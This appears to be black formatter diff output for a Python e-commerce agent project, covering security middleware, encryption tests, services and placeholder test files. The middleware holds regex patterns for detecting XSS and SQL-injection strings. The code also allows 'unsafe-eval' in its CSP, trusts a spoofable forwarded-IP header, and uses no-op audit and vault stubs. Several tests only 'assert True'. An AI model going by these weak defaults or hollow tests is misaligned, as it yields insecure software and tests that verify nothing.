+
 
 # Global instances
 rate_limiter = AdvancedRateLimiter()
 input_validator = InputValidator()
 threat_detector = ThreatDetectionSystem()
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/security/security_hardening.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/security/production_hardening.py	2025-06-16 05:08:12.921750+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/security/production_hardening.py	2025-06-19 04:03:57.598547+00:00
@@ -22,29 +22,29 @@
 logger = logging.getLogger(__name__)
 
 
 class SecurityConfig(BaseModel):
     """Production security configuration."""
-    
+
     # HTTPS/TLS Configuration
     force_https: bool = True
     hsts_max_age: int = 31536000  # 1 year
     hsts_include_subdomains: bool = True
     hsts_preload: bool = True
-    
+
     # Rate Limiting (Production Scale)
     rate_limit_requests_per_minute: int = 1000  # Support high traffic
     rate_limit_burst_requests: int = 50
     rate_limit_auth_requests_per_minute: int = 500  # Support 100+ concurrent users
     rate_limit_upload_requests_per_minute: int = 10
-    
+
     # Request Validation
     max_request_size: int = 10 * 1024 * 1024  # 10MB
     max_json_depth: int = 10
     max_array_length: int = 1000
     max_string_length: int = 10000
-    
+
     # Security Headers
     content_security_policy: str = (
         "default-src 'self'; "
         "script-src 'self' 'unsafe-inline' 'unsafe-eval'; "
         "style-src 'self' 'unsafe-inline'; "
@@ -53,55 +53,52 @@
         "connect-src 'self' wss: https:; "
         "frame-ancestors 'none'; "
         "base-uri 'self'; "
         "form-action 'self'"
     )
-    
+
     # IP Security
     blocked_ips: Set[str] = Field(default_factory=set)
     allowed_ips: Optional[Set[str]] = None  # None = allow all, Set = whitelist
     max_failed_attempts: int = 5
     lockout_duration_minutes: int = 30
-    
+
     # API Security
     require_api_key: bool = False  # Enable for production API access
     api_key_header: str = "X-API-Key"
     request_signing_required: bool = False  # Enable for high-security APIs
-    
+
     # Monitoring
     enable_security_logging: bool = True
     log_failed_requests: bool = True
     log_suspicious_activity: bool = True
 
 
 class HTTPSRedirectMiddleware(BaseHTTPMiddleware):
     """Middleware to enforce HTTPS in production."""
-    
+
     def __init__(self, app, force_https: bool = True):
         super().__init__(app)
         self.force_https = force_https
-    
+
     async def dispatch(self, request: Request, call_next):
         # Skip HTTPS enforcement for health checks and local development
         if not self.force_https or request.url.hostname in ["localhost", "127.0.0.1"]:
             return await call_next(request)
-        
+
         # Check if request is HTTPS
         if request.url.scheme != "https":
             # Redirect to HTTPS
             https_url = request.url.replace(scheme="https")
-            return Response(
-                status_code=301,
-                headers={"Location": str(https_url)}
-            )
-        
+            return Response(status_code=301, headers={"Location": str(https_url)})
+
         return await call_next(request)
 
 
 class RequestValidationMiddleware(BaseHTTPMiddleware):
     """Middleware for comprehensive request validation."""
-    
+
     def __init__(self, app, config: SecurityConfig):
         super().__init__(app)
         self.config = config
         self.suspicious_patterns = [
             r"<script[^>]*>.*?</script>",  # XSS attempts
@@ -119,157 +116,177 @@
             r"union\s+select",  # SQL injection
             r"drop\s+table",  # SQL injection
             r"insert\s+into",  # SQL injection
             r"delete\s+from",  # SQL injection
         ]
-        self.compiled_patterns = [re.compile(pattern, re.IGNORECASE) for pattern in self.suspicious_patterns]
-    
+        self.compiled_patterns = [
+            re.compile(pattern, re.IGNORECASE) for pattern in self.suspicious_patterns
+        ]
+
     async def dispatch(self, request: Request, call_next):
         # Validate request size
         content_length = request.headers.get("content-length")
         if content_length and int(content_length) > self.config.max_request_size:
-            logger.warning(f"Request size too large: {content_length} bytes from {self.get_client_ip(request)}")
+            logger.warning(
+                f"Request size too large: {content_length} bytes from {self.get_client_ip(request)}"
+            )
             return JSONResponse(
-                status_code=413,
-                content={"error": "Request entity too large"}
+                status_code=413, content={"error": "Request entity too large"}
             )
-        
+
         # Validate content type for POST/PUT requests
         if request.method in ["POST", "PUT", "PATCH"]:
             content_type = request.headers.get("content-type", "")
             allowed_types = [
                 "application/json",
                 "application/x-www-form-urlencoded",
                 "multipart/form-data",
-                "text/plain"
+                "text/plain",
             ]
             if not any(allowed_type in content_type for allowed_type in allowed_types):
-                logger.warning(f"Invalid content type: {content_type} from {self.get_client_ip(request)}")
+                logger.warning(
+                    f"Invalid content type: {content_type} from {self.get_client_ip(request)}"
+                )
                 return JSONResponse(
-                    status_code=415,
-                    content={"error": "Unsupported media type"}
+                    status_code=415, content={"error": "Unsupported media type"}
                 )
-        
+
         # Check for suspicious patterns in URL and headers
         suspicious_found = False
         check_strings = [
             str(request.url),
             request.headers.get("user-agent", ""),
             request.headers.get("referer", ""),
         ]
-        
+
         for check_string in check_strings:
             for pattern in self.compiled_patterns:
                 if pattern.search(check_string):
                     suspicious_found = True
-                    logger.warning(f"Suspicious pattern detected in request from {self.get_client_ip(request)}: {pattern.pattern}")
+                    logger.warning(
+                        f"Suspicious pattern detected in request from {self.get_client_ip(request)}: {pattern.pattern}"
+                    )
                     break
             if suspicious_found:
                 break
-        
+
         if suspicious_found:
-            return JSONResponse(
-                status_code=400,
-                content={"error": "Invalid request"}
-            )
-        
+            return JSONResponse(status_code=400, content={"error": "Invalid request"})
+
         return await call_next(request)
-    
+
     def get_client_ip(self, request: Request) -> str:
         """Get client IP address."""
         forwarded_for = request.headers.get("x-forwarded-for")
         if forwarded_for:
             return forwarded_for.split(",")[0].strip()
         return request.client.host if request.client else "unknown"
 
 
 class SecurityMonitoringMiddleware(BaseHTTPMiddleware):
     """Middleware for security monitoring and alerting."""
-    
+
     def __init__(self, app, config: SecurityConfig):
         super().__init__(app)
         self.config = config
         self.failed_attempts: Dict[str, List[datetime]] = {}
         self.blocked_ips: Set[str] = set()
         self.suspicious_activity: Dict[str, int] = {}
-    
+
     async def dispatch(self, request: Request, call_next):
         client_ip = self.get_client_ip(request)
         start_time = time.time()
-        
+
         # Check if IP is blocked
         if client_ip in self.blocked_ips:
             logger.warning(f"Blocked IP attempted access: {client_ip}")
-            return JSONResponse(
-                status_code=403,
-                content={"error": "Access denied"}
-            )
-        
+            return JSONResponse(status_code=403, content={"error": "Access denied"})
+
         # Process request
         response = await call_next(request)
         processing_time = time.time() - start_time
-        
+
         # Monitor for security events
-        await self.monitor_security_events(request, response, client_ip, processing_time)
-        
+        await self.monitor_security_events(
+            request, response, client_ip, processing_time
+        )
+
         return response
-    
-    async def monitor_security_events(self, request: Request, response: Response, client_ip: str, processing_time: float):
+
+    async def monitor_security_events(
+        self,
+        request: Request,
+        response: Response,
+        client_ip: str,
+        processing_time: float,
+    ):
         """Monitor and log security events."""
-        
+
         # Log failed authentication attempts
         if response.status_code == 401:
             await self.log_failed_attempt(client_ip, request.url.path)
-        
+
         # Log suspicious activity
         if response.status_code in [400, 403, 404, 429]:
-            self.suspicious_activity[client_ip] = self.suspicious_activity.get(client_ip, 0) + 1
-            
+            self.suspicious_activity[client_ip] = (
+                self.suspicious_activity.get(client_ip, 0) + 1
+            )
+
             # Block IP if too many suspicious requests
             if self.suspicious_activity[client_ip] > 20:  # 20 suspicious requests
                 self.block_ip(client_ip, "Excessive suspicious activity")
-        
+
         # Log slow requests (potential DoS)
         if processing_time > 10.0:  # 10 seconds
-            logger.warning(f"Slow request detected: {processing_time:.2f}s from {client_ip} to {request.url.path}")
-        
+            logger.warning(
+                f"Slow request detected: {processing_time:.2f}s from {client_ip} to {request.url.path}"
+            )
+
         # Log security events if enabled
         if self.config.enable_security_logging:
             await self.log_security_event(request, response, client_ip, processing_time)
-    
+
     async def log_failed_attempt(self, client_ip: str, path: str):
         """Log and track failed authentication attempts."""
         now = datetime.now()
-        
+
         if client_ip not in self.failed_attempts:
             self.failed_attempts[client_ip] = []
-        
+
         # Add current attempt
         self.failed_attempts[client_ip].append(now)
-        
+
         # Clean old attempts (older than lockout duration)
         cutoff = now - timedelta(minutes=self.config.lockout_duration_minutes)
         self.failed_attempts[client_ip] = [
-            attempt for attempt in self.failed_attempts[client_ip] 
-            if attempt > cutoff
+            attempt for attempt in self.failed_attempts[client_ip] if attempt > cutoff
         ]
-        
+
         # Check if should block IP
         if len(self.failed_attempts[client_ip]) >= self.config.max_failed_attempts:
-            self.block_ip(client_ip, f"Too many failed attempts: {len(self.failed_attempts[client_ip])}")
-    
+            self.block_ip(
+                client_ip,
+                f"Too many failed attempts: {len(self.failed_attempts[client_ip])}",
+            )
+
     def block_ip(self, client_ip: str, reason: str):
         """Block an IP address."""
         self.blocked_ips.add(client_ip)
         logger.critical(f"IP BLOCKED: {client_ip} - Reason: {reason}")
-        
+
         # TODO: Integrate with external security systems
         # - Add to firewall rules
         # - Send alert to security team
         # - Update threat intelligence feeds
-    
-    async def log_security_event(self, request: Request, response: Response, client_ip: str, processing_time: float):
+
+    async def log_security_event(
+        self,
+        request: Request,
+        response: Response,
+        client_ip: str,
+        processing_time: float,
+    ):
         """Log security events for monitoring."""
         event = {
             "timestamp": datetime.now().isoformat(),
             "client_ip": client_ip,
             "method": request.method,
@@ -277,91 +294,83 @@
             "status_code": response.status_code,
             "processing_time": processing_time,
             "user_agent": request.headers.get("user-agent", ""),
             "referer": request.headers.get("referer", ""),
         }
-        
+
         # Log to security monitoring system
         logger.info(f"SECURITY_EVENT: {json.dumps(event)}")
-    
+
     def get_client_ip(self, request: Request) -> str:
         """Get client IP address."""
         forwarded_for = request.headers.get("x-forwarded-for")
         if forwarded_for:
             return forwarded_for.split(",")[0].strip()
         return request.client.host if request.client else "unknown"
 
 
 class ProductionSecurityHeaders:
     """Production-ready security headers."""
-    
+
     @staticmethod
     def get_headers(config: SecurityConfig) -> Dict[str, str]:
         """Get production security headers."""
         headers = {
             # HSTS
             "Strict-Transport-Security": f"max-age={config.hsts_max_age}; includeSubDomains; preload",
-            
             # Content Security Policy
             "Content-Security-Policy": config.content_security_policy,
-            
             # Frame Options
             "X-Frame-Options": "DENY",
-            
             # Content Type Options
             "X-Content-Type-Options": "nosniff",
-            
             # XSS Protection
             "X-XSS-Protection": "1; mode=block",
-            
             # Referrer Policy
             "Referrer-Policy": "strict-origin-when-cross-origin",
-            
             # Permissions Policy
             "Permissions-Policy": (
                 "geolocation=(), microphone=(), camera=(), payment=(), "
                 "usb=(), magnetometer=(), gyroscope=(), accelerometer=()"
             ),
-            
             # Hide server information
             "Server": "FlipSync",
-            
             # Cache Control for sensitive endpoints
             "Cache-Control": "no-store, no-cache, must-revalidate, private",
             "Pragma": "no-cache",
             "Expires": "0",
         }
-        
+
         return headers
 
 
 def create_production_security_middleware(app, config: Optional[SecurityConfig] = None):
     """Create and configure production security middleware stack."""
     if config is None:
         config = SecurityConfig()
-    
+
     # Add HTTPS redirect middleware
     app.add_middleware(HTTPSRedirectMiddleware, force_https=config.force_https)
-    
+
     # Add request validation middleware
     app.add_middleware(RequestValidationMiddleware, config=config)
-    
+
     # Add security monitoring middleware
     app.add_middleware(SecurityMonitoringMiddleware, config=config)
-    
+
     # Add security headers middleware
     @app.middleware("http")
     async def add_production_security_headers(request: Request, call_next):
         response = await call_next(request)
-        
+
         # Add production security headers
         headers = ProductionSecurityHeaders.get_headers(config)
         for header, value in headers.items():
             response.headers[header] = value
-        
+
         return response
-    
+
     logger.info("Production security middleware stack configured")
     return app
 
 
 # Security utility functions
@@ -371,20 +380,22 @@
 
 
 def generate_security_token() -> str:
     """Generate a cryptographically secure token."""
     import secrets
+
     return secrets.token_urlsafe(32)
 
 
 def hash_sensitive_data(data: str, salt: str = None) -> str:
     """Hash sensitive data with salt."""
     if salt is None:
         import secrets
+
         salt = secrets.token_hex(16)
-    
-    return hashlib.pbkdf2_hmac('sha256', data.encode(), salt.encode(), 100000).hex()
+
+    return hashlib.pbkdf2_hmac("sha256", data.encode(), salt.encode(), 100000).hex()
 
 
 def is_safe_url(url: str, allowed_hosts: List[str]) -> bool:
     """Check if URL is safe for redirects."""
     try:
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/security/production_hardening.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/services/marketplace_service.py	2025-06-14 20:35:30.803769+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/services/marketplace_service.py	2025-06-19 04:03:57.609791+00:00
@@ -20,11 +20,13 @@
         Args:
             database: Database instance
         """
         self.database = database
 
-    async def create_marketplace(self, marketplace_data: Dict[str, Any]) -> Dict[str, Any]:
+    async def create_marketplace(
+        self, marketplace_data: Dict[str, Any]
+    ) -> Dict[str, Any]:
         """Create a new marketplace.
 
         Args:
             marketplace_data: Marketplace data
 
@@ -34,11 +36,13 @@
         async with self.database.get_session() as session:
             repository = MarketplaceRepository(session)
             marketplace_model = await repository.create_marketplace(marketplace_data)
             return marketplace_model.to_dict()
 
-    async def get_marketplace_by_id(self, marketplace_id: str) -> Optional[Dict[str, Any]]:
+    async def get_marketplace_by_id(
+        self, marketplace_id: str
+    ) -> Optional[Dict[str, Any]]:
         """Get a marketplace by ID.
 
         Args:
             marketplace_id: Marketplace ID
 
@@ -59,11 +63,13 @@
             List[Dict[str, Any]]: List of marketplace data
         """
         async with self.database.get_session() as session:
             repository = MarketplaceRepository(session)
             marketplace_models = await repository.get_all_marketplaces()
-            return [marketplace_model.to_dict() for marketplace_model in marketplace_models]
+            return [
+                marketplace_model.to_dict() for marketplace_model in marketplace_models
+            ]
 
     async def update_marketplace(
         self, marketplace_id: str, marketplace_data: Dict[str, Any]
     ) -> Optional[Dict[str, Any]]:
         """Update a marketplace.
@@ -75,11 +81,13 @@
         Returns:
             Optional[Dict[str, Any]]: Updated marketplace data if found, None otherwise
         """
         async with self.database.get_session() as session:
             repository = MarketplaceRepository(session)
-            marketplace_model = await repository.update_marketplace(marketplace_id, marketplace_data)
+            marketplace_model = await repository.update_marketplace(
+                marketplace_id, marketplace_data
+            )
             if marketplace_model:
                 return marketplace_model.to_dict()
             return None
 
     async def delete_marketplace(self, marketplace_id: str) -> bool:
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/services/marketplace_service.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/security/token_manager.py	2025-06-14 20:35:30.803769+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/security/token_manager.py	2025-06-19 04:03:57.614765+00:00
@@ -8,21 +8,25 @@
 # from fs_agt_clean.core.security.audit_logger import AuditEventType, SecurityAuditLogger  # Temporarily disabled
 # from fs_agt_clean.core.utils.logging import get_logger  # Temporarily disabled
 # from fs_agt_clean.core.vault.secret_manager import VaultSecretManager  # Temporarily disabled
 
 import logging
+
 logger = logging.getLogger(__name__)
+
 
 # Temporary replacements
 class AuditEventType:
     TOKEN_REVOKED = "token_revoked"
     AUTH_FAILURE = "auth_failure"
     AUTH_SUCCESS = "auth_success"
 
+
 class SecurityAuditLogger:
     async def log_event(self, **kwargs):
         pass
+
 
 class VaultSecretManager:
     async def get_secret(self, key):
         return None
 
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/security/token_manager.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/security/test_encryption.py	2025-06-14 20:35:30.803769+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/security/test_encryption.py	2025-06-19 04:03:57.670820+00:00
@@ -30,27 +30,28 @@
         }
         self.mock_config_manager.get.return_value = None
 
         # Reset the singleton instance
         EncryptionHandler._instance = None
-        
+
         # Create encryption handler
         self.encryption_handler = EncryptionHandler(
             config_manager=self.mock_config_manager
         )
-        
+
         # Initialize with a test key
         self.test_key = b"0" * 32
         self.encryption_handler.initialize(master_key=self.test_key)
 
     def tearDown(self):
         """Clean up test environment."""
         # Reset the singleton instance
         EncryptionHandler._instance = None
-        
+
         # Reset the global instance
         import sys
+
         module = sys.modules[EncryptionHandler.__module__]
         module._encryption_handler_instance = None
 
     def test_singleton(self):
         """Test that EncryptionHandler is a singleton."""
@@ -60,124 +61,124 @@
 
     def test_get_encryption_handler(self):
         """Test get_encryption_handler function."""
         handler = get_encryption_handler()
         self.assertIsInstance(handler, EncryptionHandler)
-        
+
         # Should return the same instance
         handler2 = get_encryption_handler()
         self.assertIs(handler, handler2)
 
     def test_initialize(self):
         """Test initialization."""
         # Reset handler
         self.encryption_handler._master_key = None
-        
+
         # Initialize with a new key
         result = self.encryption_handler.initialize(master_key=b"1" * 32)
         self.assertTrue(result)
         self.assertEqual(self.encryption_handler._master_key, b"1" * 32)
 
     def test_initialize_from_config(self):
         """Test initialization from config."""
         # Reset handler
         self.encryption_handler._master_key = None
-        
+
         # Mock config
         key_str = base64.b64encode(b"2" * 32).decode()
         self.mock_config_manager.get.return_value = key_str
-        
+
         # Initialize
         result = self.encryption_handler.initialize()
         self.assertTrue(result)
         self.assertEqual(self.encryption_handler._master_key, b"2" * 32)
 
     def test_initialize_generate_key(self):
         """Test initialization with key generation."""
         # Reset handler
         self.encryption_handler._master_key = None
-        
+
         # Mock config
         self.mock_config_manager.get.return_value = None
-        
+
         # Initialize
         result = self.encryption_handler.initialize()
         self.assertTrue(result)
         self.assertIsNotNone(self.encryption_handler._master_key)
         self.assertEqual(len(self.encryption_handler._master_key), 32)
-        
+
         # Should save to config
         self.mock_config_manager.set.assert_called_once()
         args, _ = self.mock_config_manager.set.call_args
         self.assertEqual(args[0], "encryption.master_key")
 
     def test_encrypt_decrypt_string(self):
         """Test encrypting and decrypting a string."""
         # Encrypt
         plaintext = "Hello, world!"
         encrypted = self.encryption_handler.encrypt(plaintext)
-        
+
         # Verify structure
         self.assertIsInstance(encrypted, dict)
         self.assertEqual(encrypted["version"], "1")
         self.assertEqual(encrypted["algorithm"], "AES-256-GCM")
         self.assertIn("salt", encrypted)
         self.assertIn("nonce", encrypted)
         self.assertIn("ciphertext", encrypted)
-        
+
         # Decrypt
         decrypted = self.encryption_handler.decrypt(encrypted)
         self.assertEqual(decrypted.decode(), plaintext)
 
     def test_encrypt_decrypt_bytes(self):
         """Test encrypting and decrypting bytes."""
         # Encrypt
         plaintext = b"Hello, world!"
         encrypted = self.encryption_handler.encrypt(plaintext)
-        
+
         # Decrypt
         decrypted = self.encryption_handler.decrypt(encrypted)
         self.assertEqual(decrypted, plaintext)
 
     def test_encrypt_decrypt_dict(self):
         """Test encrypting and decrypting a dictionary."""
         # Encrypt
         plaintext = {"name": "John", "age": 30}
         encrypted = self.encryption_handler.encrypt(plaintext)
-        
+
         # Decrypt
         decrypted = self.encryption_handler.decrypt(encrypted)
         self.assertEqual(decrypted, str(plaintext).encode())
 
     def test_encrypt_decrypt_with_context(self):
         """Test encrypting and decrypting with context."""
         # Encrypt
         plaintext = "Hello, world!"
         context = "test_context"
         encrypted = self.encryption_handler.encrypt(plaintext, context)
-        
+
         # Verify context
         self.assertEqual(encrypted["context"], context)
-        
+
         # Decrypt
         decrypted = self.encryption_handler.decrypt(encrypted)
         self.assertEqual(decrypted.decode(), plaintext)
 
     def test_encrypt_not_initialized(self):
         """Test encrypting when not initialized."""
         # Reset handler
         self.encryption_handler._master_key = None
-        
+
         # Encrypt
         with self.assertRaises(RuntimeError):
             self.encryption_handler.encrypt("Hello, world!")
 
     def test_decrypt_not_initialized(self):
         """Test decrypting when not initialized."""
         # Reset handler
         self.encryption_handler._master_key = None
-        
+
         # Decrypt
         encrypted_data = EncryptedData(
             version="1",
             algorithm="AES-256-GCM",
             salt="salt",
@@ -197,11 +198,11 @@
             salt=base64.b64encode(b"salt").decode(),
             nonce=base64.b64encode(b"nonce").decode(),
             ciphertext=base64.b64encode(b"ciphertext").decode(),
             context="",
         )
-        
+
         # Decrypt
         with self.assertRaises(ValueError):
             self.encryption_handler.decrypt(encrypted_data)
 
     def test_decrypt_invalid_algorithm(self):
@@ -213,27 +214,27 @@
             salt=base64.b64encode(b"salt").decode(),
             nonce=base64.b64encode(b"nonce").decode(),
             ciphertext=base64.b64encode(b"ciphertext").decode(),
             context="",
         )
-        
+
         # Decrypt
         with self.assertRaises(ValueError):
             self.encryption_handler.decrypt(encrypted_data)
 
     def test_rotate_master_key(self):
         """Test rotating the master key."""
         # Store original key
         original_key = self.encryption_handler._master_key
-        
+
         # Rotate key
         result = self.encryption_handler.rotate_master_key()
         self.assertTrue(result)
-        
+
         # Verify key changed
         self.assertNotEqual(self.encryption_handler._master_key, original_key)
-        
+
         # Should save to config
         self.mock_config_manager.set.assert_called_with(
             "encryption.master_key",
             base64.b64encode(self.encryption_handler._master_key).decode(),
         )
@@ -250,18 +251,18 @@
     def test_hash_verify_password(self):
         """Test hashing and verifying a password."""
         # Hash password
         password = "password123"
         password_hash = self.encryption_handler.hash_password(password)
-        
+
         # Verify structure
         self.assertIsInstance(password_hash, str)
-        
+
         # Verify password
         result = self.encryption_handler.verify_password(password, password_hash)
         self.assertTrue(result)
-        
+
         # Verify wrong password
         result = self.encryption_handler.verify_password("wrong", password_hash)
         self.assertFalse(result)
 
     def test_verify_password_invalid_hash(self):
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/security/test_encryption.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/payment/paypal_service.py	2025-06-14 20:35:30.799760+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/payment/paypal_service.py	2025-06-19 04:03:57.689957+00:00
@@ -87,11 +87,14 @@
 
 logger = logging.getLogger(__name__)
 
 try:
     from fs_agt_clean.core.payment.invoice_generator import Invoice, InvoiceGenerator
-    from fs_agt_clean.core.payment.subscription_model import BillingCycle, SubscriptionPlan
+    from fs_agt_clean.core.payment.subscription_model import (
+        BillingCycle,
+        SubscriptionPlan,
+    )
 except ImportError:
     # Create mock classes if the imports are not available
     class Invoice:  # type: ignore
         """Mock Invoice if module is not available."""
 
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/payment/paypal_service.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/state_management/test___init__.py	2025-06-14 20:35:30.803769+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/state_management/test___init__.py	2025-06-19 04:03:57.719493+00:00
@@ -12,50 +12,52 @@
 sys.path.insert(0, str(Path(__file__).parent.parent))
 
 # Import the module under test
 # from __init__ import *
 
+
 class TestInitStateManagement:
     """State management test class for __init__."""
-    
+
     def test_import(self):
         """Test that the module can be imported."""
         # TODO: Add actual import test
         assert True
-    
+
     def test_state_persistence(self):
         """Test state persistence functionality."""
         # TODO: Add state persistence tests
         assert True
-    
+
     def test_state_loading(self):
         """Test state loading functionality."""
         # TODO: Add state loading tests
         assert True
-    
+
     def test_state_synchronization(self):
         """Test state synchronization if applicable."""
         # TODO: Add state synchronization tests
         assert True
-    
+
     def test_mobile_state_reconciliation(self):
         """Test mobile state reconciliation if applicable."""
         # TODO: Add mobile state reconciliation tests
         assert True
-    
+
     def test_cache_management(self):
         """Test cache management if applicable."""
         # TODO: Add cache management tests
         assert True
-    
+
     def test_error_handling(self):
         """Test error handling in state operations."""
         # TODO: Add error handling tests
         assert True
-    
+
     def test_vision_alignment(self):
         """Test vision alignment requirements."""
         # TODO: Add vision alignment tests for state management
         assert True
 
+
 if __name__ == "__main__":
     pytest.main([__file__])
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/state_management/test___init__.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/state_management/test_persistence_manager.py	2025-06-14 20:35:30.803769+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/state_management/test_persistence_manager.py	2025-06-19 04:03:57.742378+00:00
@@ -12,50 +12,52 @@
 sys.path.insert(0, str(Path(__file__).parent.parent))
 
 # Import the module under test
 # from persistence_manager import *
 
+
 class TestPersistenceManagerStateManagement:
     """State management test class for persistence_manager."""
-    
+
     def test_import(self):
         """Test that the module can be imported."""
         # TODO: Add actual import test
         assert True
-    
+
     def test_state_persistence(self):
         """Test state persistence functionality."""
         # TODO: Add state persistence tests
         assert True
-    
+
     def test_state_loading(self):
         """Test state loading functionality."""
         # TODO: Add state loading tests
         assert True
-    
+
     def test_state_synchronization(self):
         """Test state synchronization if applicable."""
         # TODO: Add state synchronization tests
         assert True
-    
+
     def test_mobile_state_reconciliation(self):
         """Test mobile state reconciliation if applicable."""
         # TODO: Add mobile state reconciliation tests
         assert True
-    
+
     def test_cache_management(self):
         """Test cache management if applicable."""
         # TODO: Add cache management tests
         assert True
-    
+
     def test_error_handling(self):
         """Test error handling in state operations."""
         # TODO: Add error handling tests
         assert True
-    
+
     def test_vision_alignment(self):
         """Test vision alignment requirements."""
         # TODO: Add vision alignment tests for state management
         assert True
 
+
 if __name__ == "__main__":
     pytest.main([__file__])
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/state_management/test_persistence_manager.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/services/user_service.py	2025-06-14 20:35:30.803769+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/services/user_service.py	2025-06-19 04:03:57.756573+00:00
@@ -33,10 +33,11 @@
             self.status = kwargs.get("status", UserStatus.ACTIVE)
             self.created_at = kwargs.get("created_at", datetime.now())
             self.updated_at = kwargs.get("updated_at", datetime.now())
             self.last_login = kwargs.get("last_login")
             self.mfa_enabled = kwargs.get("mfa_enabled", False)
+
 
 logger = logging.getLogger(__name__)
 
 
 class UserService:
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/services/user_service.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/state_management/test_state_manager.py	2025-06-14 20:35:30.803769+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/state_management/test_state_manager.py	2025-06-19 04:03:57.772098+00:00
@@ -12,50 +12,52 @@
 sys.path.insert(0, str(Path(__file__).parent.parent))
 
 # Import the module under test
 # from state_manager import *
 
+
 class TestStateManagerStateManagement:
     """State management test class for state_manager."""
-    
+
     def test_import(self):
         """Test that the module can be imported."""
         # TODO: Add actual import test
         assert True
-    
+
     def test_state_persistence(self):
         """Test state persistence functionality."""
         # TODO: Add state persistence tests
         assert True
-    
+
     def test_state_loading(self):
         """Test state loading functionality."""
         # TODO: Add state loading tests
         assert True
-    
+
     def test_state_synchronization(self):
         """Test state synchronization if applicable."""
         # TODO: Add state synchronization tests
         assert True
-    
+
     def test_mobile_state_reconciliation(self):
         """Test mobile state reconciliation if applicable."""
         # TODO: Add mobile state reconciliation tests
         assert True
-    
+
     def test_cache_management(self):
         """Test cache management if applicable."""
         # TODO: Add cache management tests
         assert True
-    
+
     def test_error_handling(self):
         """Test error handling in state operations."""
         # TODO: Add error handling tests
         assert True
-    
+
     def test_vision_alignment(self):
         """Test vision alignment requirements."""
         # TODO: Add vision alignment tests for state management
         assert True
 
+
 if __name__ == "__main__":
     pytest.main([__file__])
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/state_management/test_state_manager.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/services/agent_service.py	2025-06-14 20:35:30.803769+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/services/agent_service.py	2025-06-19 04:03:57.798374+00:00
@@ -16,67 +16,67 @@
 
 
 class AgentService(ABC):
     """
     Abstract base class for all agent services.
-    
+
     This class defines the common interface that all agent services
     must implement to work with the agent connectivity system.
     """
-    
+
     def __init__(self, agent_type: str, config: Optional[Dict[str, Any]] = None):
         """
         Initialize the agent service.
-        
+
         Args:
             agent_type: Type identifier for this agent
             config: Optional configuration dictionary
         """
         self.agent_type = agent_type
         self.config = config or {}
         self.initialized = False
         self.status = "initializing"
         self.last_activity = datetime.now()
-        
+
         logger.info(f"Initializing {agent_type} agent service")
-    
+
     @abstractmethod
     async def process_message(
         self,
         message: ChatMessage,
         intent: MessageIntent,
         conversation_history: Optional[List[ChatMessage]] = None,
-        context: Optional[Dict[str, Any]] = None
+        context: Optional[Dict[str, Any]] = None,
     ) -> AgentResponse:
         """
         Process a user message and generate a response.
-        
+
         Args:
             message: The user message to process
             intent: The recognized intent of the message
             conversation_history: Optional conversation history
             context: Optional context information
-            
+
         Returns:
             Agent response
         """
         pass
-    
+
     @abstractmethod
     async def get_status(self) -> Dict[str, Any]:
         """
         Get the current status of the agent service.
-        
+
         Returns:
             Dictionary containing status information
         """
         pass
-    
+
     async def initialize(self) -> bool:
         """
         Initialize the agent service.
-        
+
         Returns:
             True if initialization was successful, False otherwise
         """
         try:
             await self._initialize_agent()
@@ -86,158 +86,158 @@
             return True
         except Exception as e:
             logger.error(f"Failed to initialize {self.agent_type} agent service: {e}")
             self.status = "error"
             return False
-    
+
     async def _initialize_agent(self) -> None:
         """
         Perform agent-specific initialization.
-        
+
         Override this method in subclasses to implement
         agent-specific initialization logic.
         """
         pass
-    
+
     async def shutdown(self) -> None:
         """
         Shutdown the agent service.
         """
         try:
             await self._shutdown_agent()
             self.status = "shutdown"
             logger.info(f"{self.agent_type} agent service shutdown successfully")
         except Exception as e:
             logger.error(f"Error shutting down {self.agent_type} agent service: {e}")
-    
+
     async def _shutdown_agent(self) -> None:
         """
         Perform agent-specific shutdown.
-        
+
         Override this method in subclasses to implement
         agent-specific shutdown logic.
         """
         pass
-    
+
     def update_activity(self) -> None:
         """Update the last activity timestamp."""
         self.last_activity = datetime.now()
-    
+
     def get_capabilities(self) -> List[str]:
         """
         Get the capabilities of this agent.
-        
+
         Returns:
             List of capability strings
         """
         return self.config.get("capabilities", [])
-    
+
     def supports_intent(self, intent_type: str) -> bool:
         """
         Check if this agent supports a specific intent type.
-        
+
         Args:
             intent_type: The intent type to check
-            
+
         Returns:
             True if the agent supports this intent type
         """
         supported_intents = self.config.get("supported_intents", [])
         return intent_type in supported_intents
-    
+
     def get_config_value(self, key: str, default: Any = None) -> Any:
         """
         Get a configuration value.
-        
+
         Args:
             key: Configuration key
             default: Default value if key not found
-            
+
         Returns:
             Configuration value or default
         """
         return self.config.get(key, default)
 
 
 class MockAgentService(AgentService):
     """
     Mock agent service for testing and legacy compatibility.
-    
+
     This service provides basic responses for any intent type
     and can be used as a fallback or for testing purposes.
     """
-    
-    def __init__(self, agent_type: str = "mock", config: Optional[Dict[str, Any]] = None):
+
